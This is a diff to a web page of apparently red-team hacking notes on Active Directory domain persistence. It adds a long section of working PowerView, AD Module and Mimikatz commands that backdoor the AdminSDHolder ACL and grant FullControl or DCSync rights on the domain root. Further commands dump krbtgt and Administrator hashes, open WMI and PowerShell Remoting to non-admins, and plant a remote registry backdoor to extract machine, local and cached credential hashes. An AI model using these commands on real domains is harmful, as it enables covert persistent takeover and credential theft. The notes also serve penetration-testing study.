@@ -65,6 +65,8 @@
 								
 									<li class="nav-item current"><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
+								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
 							</ul>
@@ -290,7 +292,7 @@
 Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\krbtgt"'</span>
 </code></pre></div></div>
 <blockquote>
-  <p><strong>RedTeam Note</strong>: Using DCSync option does not need code execution on the target DC. For that reason is more silent than dumping the LSA.</p>
+  <p><strong>RedTeam Note</strong>: Using DCSync option does not need code execution on the target DC. For that reason is more silent than dumping the LSA. DCSync is a technique which allows an attacker to hijack the Domain Controller account and replicate data such as passwords of all domain controllers.</p>
 </blockquote>
 
 <p>After that we need to create the ticket.</p>
@@ -565,6 +567,222 @@ mimikatz# !-
 </code></pre></div></div>
 
 <p>All local logons on the domain controller are logged to <code class="highlighter-rouge">C:\Windows\system32\kiwissp.log</code>.</p>
+
+<h1 id="using-acls">Using ACLs</h1>
+
+<p>Resides in the system container of a domain and used to control the permissions using an ACL for certain built-in privileged groups which are called the <code class="highlighter-rouge">protected groups</code>.</p>
+
+<p>Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.</p>
+
+<p>Lis of protected groups and how can be abused some of them can log on locally to the domain controller:</p>
+
+<ul>
+  <li><strong>Account Operators</strong>: Can modify nesteg groups.</li>
+  <li><strong>Bakup Operators</strong>: Backup GPO, edit ato add SID of controller account to a privileged gorup and restore.</li>
+  <li><strong>Server Operators</strong>: Run a command as system</li>
+  <li><strong>Print Operators</strong>: Copy ntds.dit backup, load device drivers.</li>
+  <li><strong>Domain Admins</strong>: Can log on.</li>
+  <li><strong>Replicator</strong>: Can log on.</li>
+  <li><strong>Enterprise Admins</strong>: Can log on.</li>
+  <li><strong>Domain Controllers</strong>: Can log on.</li>
+  <li><strong>Read-only Domain Controllers</strong>: Can log on.</li>
+  <li><strong>Schema Admins</strong>: Can log on.</li>
+  <li><strong>Administrators</strong>: Can log on.</li>
+</ul>
+
+<p>With Domain Admin privileges which means that we have full control and write permissions on the <code class="highlighter-rouge">AdminSDHolder</code> object, this full control can be abused to create a backdoor or persistence mechanism by adding a user with <strong>Full Permissions</strong> to the AdminSDHolder object.</p>
+
+<p>In 60 minutes when the SDPROP is runned, the user will be added with Full Control access to the ACL of gropus like Domain Admins without actually being a member of it.</p>
+
+<p>Fist we need to add full controll permissions fo a user to the AdminSDHolder:</p>
+
+<ul>
+  <li>PowerView:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetADSprefix <span class="s1">'CN=AdminSDHolder,CN=System'</span> -PrincipalSamAccountName user1 -Rights All -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>AD Module:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-ADACL -DistinguishedName <span class="s1">'CN=AdminSDHolder,CN=System,DC=corp,DC=local'</span> -Principal user1 -Verbose 
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<blockquote>
+  <p><strong>Note</strong>: Other interesing permissions for a user to the AdminSDHolder:</p>
+
+  <p><code class="highlighter-rouge">ResetPassword</code>, <code class="highlighter-rouge">WriteMembers</code>.</p>
+</blockquote>
+
+<p>After 60 minutes the ACL will be propagated automatically to the domain.</p>
+
+<p>It can be also posible to propagate it manually with <code class="highlighter-rouge">Invoke-SDPropatagor.ps1</code></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sess</span> <span class="o">=</span> New-PSSession -ComputerName dc01.corp.local
+Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session <span class="nv">$sess</span>
+Enter-PSSession -Session <span class="nv">$sess</span>
+
+And on the DC:
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+</code></pre></div></div>
+
+<p>To check the Domain Admin Permissions as normal user:</p>
+
+<ul>
+  <li>PowerView:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ObjectACL -SamAccountName <span class="s2">"Domain Admins"</span> -ResolveGUIDs | ?<span class="o">{</span><span class="nv">$_</span>.IdentityReference -match <span class="s1">'user1'</span><span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>AD Module:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">Get-Acl</span> -Path <span class="s1">'AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local'</span><span class="o">)</span>.Access | ?<span class="o">{</span><span class="nv">$_</span>.IdentityReference -match <span class="s1">'user1'</span><span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<blockquote>
+  <p><strong>Note</strong>: <code class="highlighter-rouge">GenericAll</code> means that has FullControl to an object.</p>
+</blockquote>
+
+<p>Finally we just need to abuse it.</p>
+
+<h2 id="abusing-fullcontrol-acl">Abusing FullControl ACL</h2>
+
+<ul>
+  <li>PowerView:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainGroupMember -Identity <span class="s1">'Domain Admins'</span> -Members user2 -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>AD Module:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Add-ADGroupMember</span> -Identity <span class="s1">'Domain Admins'</span> -Members user2 -Verbose
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="abusing-resetpassword-acl">Abusing ResetPassword ACL</h2>
+
+<ul>
+  <li>PowerView:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-DomainUserPassword -Identity user2 -AccountPassword <span class="o">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"Password123!"</span> -AsPlainText -Force<span class="o">)</span> -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>AD Module:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set-ADACcountPassword</span> -Identity user2 -NewPassword <span class="o">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s2">"Password123!"</span> -AsPlainText -Force<span class="o">)</span> -Verbose
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="abusing-fullcontrol-acl-in-domain-root">Abusing FullControl ACL in domain root</h2>
+
+<p>There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl.</p>
+
+<p>First, add full control rights:</p>
+
+<ul>
+  <li>PowerView:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetDistinguishedName <span class="s1">'DC=corp,DC=local'</span> -PrincipalSamAccountName user1 -Rights All -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>AD Module:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-ADACL -DistinguishedName <span class="s1">'DC=corp,DC=local'</span> -Principal user1 -Verbose
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="abusing-dcsync-in-domain-root">Abusing DCSync in domain root</h2>
+
+<p>There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like the ability to run <code class="highlighter-rouge">DCSync</code>.</p>
+
+<ul>
+  <li>PowerView:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-ObjectAcl -TargetDistinguishedName <span class="s1">'DC=corp,DC=local'</span> -PrincipalSamAccountName user1 -Rights DCSync -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>AD Module:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-ADACL -DistinguishedName <span class="s1">'DC=corp,DC=local'</span> -Principal user1 -GUIDRight DCSync -Verbose
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<blockquote>
+  <p><strong>Note</strong>: There are three special rights which are required to DCSync:</p>
+
+  <p><code class="highlighter-rouge">Replicating Directory Changes</code>, <code class="highlighter-rouge">Replicating Directory Changes All</code> and <code class="highlighter-rouge">Replicating Directory Changes In Filtered Set</code>.</p>
+</blockquote>
+
+<p>And then execute DCSync:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\krbtgt"'</span>
+Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\Administrator"'</span>
+</code></pre></div></div>
+<p>So once we have obtained the hash NTLM of <em>any user</em> of the domain, <code class="highlighter-rouge">PassTheHash</code> or <code class="highlighter-rouge">Over-PassTheHash</code> attack can be executed.</p>
+
+<h2 id="security-descriptors">Security Descriptors</h2>
+
+<p>It is possible to modify Security Descriptors such as security information like owner, primary group, DACL and SACL of multiple remote access methods to allow access to non-admin users.</p>
+
+<p>It is a very useful backdoor mechanism but administrative privileges are required.</p>
+
+<p>Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL.</p>
+
+<p><code class="highlighter-rouge">ace\_type;ace\_flags;rights;object_guid;inherit\_object\_guid;account\_sid</code></p>
+
+<p>ACE for built-in administrators for WMI namespaces</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A;CI;CCDCLCSWRPWPRCWD;;;&lt;SID&gt;
+</code></pre></div></div>
+
+<h3 id="wmi">WMI</h3>
+
+<p>ACLs can be modified to allow non-admin users access to securable objects with <code class="highlighter-rouge">Set-RemoteWMI.ps1</code>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Set-RemoteWMI.ps1
+</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-RemoteWMI -UserName user1 -Verbose
+<span class="nb">Set</span>-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace <span class="s1">'root\cimv2'</span> -Verbose
+<span class="nb">Set</span>-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -Credential Administrator -namespace <span class="s1">'root\cimv2'</span> -Verbose
+</code></pre></div></div>
+<p>And to remove permissions:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace <span class="s1">'root\cimv2'</span> -Remove -Verbose
+</code></pre></div></div>
+
+<h3 id="powershell-remoting">PowerShell Remoting</h3>
+
+<p>Something similar we can do it with PowerShell Remoting with the script <code class="highlighter-rouge">Set-RemotePSRemoting.ps1</code>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Set-RemotePSRemoting.ps1
+
+<span class="nb">Set</span>-RemotePSRemoting -UserName user1 -Verbose
+<span class="nb">Set</span>-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Verbose
+<span class="nb">Set</span>-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Remove
+</code></pre></div></div>
+
+<h3 id="remote-registry">Remote Registry</h3>
+
+<p>Using DAMP we can modify the registry with administrative privileges.</p>
+
+<p>On a remote machine with <code class="highlighter-rouge">Add-RemoteRegBackdoor.ps1</code> script.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Add-RemoteRegBackdoor.ps1
+Add-RemoteRegBackdoor -ComputerName dc01.corp.local -Trustee user1 -Verbose
+</code></pre></div></div>
+<p>After that we can execute some interesting attacks such as getting accounts and machines hashes.</p>
+
+<ul>
+  <li>Retrive machine account hash:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Get-RemoteMachineAccountHash
+Get-RemoteMachineAccountHash -ComputerName dc01.corp.local -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>Retrieve local account hash:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Get-RemoteLocalAccountHash
+Get-RemoteLocalAccountHash -ComputerName dc01.corp.local -Verbose
+</code></pre></div>    </div>
+  </li>
+  <li>Retrive domain cached credentials:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\Get-RemoteCachedCredentials
+Get-RemoteCachedCredentials -ComputerName dc01.corp.local -Verbose
+</code></pre></div>    </div>
+  </li>
+</ul>
 
 			</article>
 		</section>
